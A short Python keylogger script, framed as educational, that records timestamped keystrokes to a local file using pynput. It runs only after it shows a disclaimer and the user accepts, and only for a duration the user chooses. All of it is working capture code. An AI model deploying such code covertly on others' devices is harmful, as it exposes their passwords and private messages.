import pynput
import time
import os
import sys

log_file_path = "keylogger_log.txt"

def keylogger(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    try:
        event = f"{timestamp} - {key.char}\n"
    except AttributeError:
        event = f"{timestamp} - {str(key)}\n"

    with open(log_file_path, "a", encoding="utf-8") as log_file:
        log_file.write(event)

def display_disclaimer():
    print("=" * 60)
    print("KEYLOGGER PROGRAM - DISCLAIMER")
    print("=" * 60)
    disclaimer = """
This keylogger is intended strictly for educational and ethical use only.
By running this program, you agree to:

1. Use only on devices where you have explicit permission.
2. Not use this program for malicious or illegal purposes.
3. Avoid collecting personal, sensitive, or confidential information.
4. Take full responsibility for any misuse or consequences.
5. Respect all privacy laws and ethical guidelines.

Unauthorized or malicious use may violate laws and result in serious consequences.
"""
    print(disclaimer)
    accept = input("Do you accept the terms and conditions? (y/n): ").strip().lower()
    if accept != 'y':
        print("\nYou must accept the terms to continue. Exiting...")
        sys.exit()

def get_log_duration():
    while True:
        try:
            duration = int(input("Enter duration (in seconds) to log keystrokes: "))
            if duration <= 0:
                print("Duration must be a positive integer.")
            else:
                return duration
        except ValueError:
            print("Invalid input. Please enter a number.")

def main():
    print("\n" + "=" * 60)
    print("Welcome to the Educational Keylogger Program")
    print("=" * 60)

    display_disclaimer()
    log_duration = get_log_duration()

    print("\n Keylogger is running...")
    print("Keystrokes will be recorded for", log_duration, "seconds.")
    print("Log file will be saved as:", os.path.abspath(log_file_path))

    listener = pynput.keyboard.Listener(on_press=keylogger)
    listener.start()

    time.sleep(log_duration)

    listener.stop()

    print("\n Keylogging session completed.")
    print("Log saved at:", os.path.abspath(log_file_path))
    print("Program finished.")

if __name__ == "__main__":
    main()
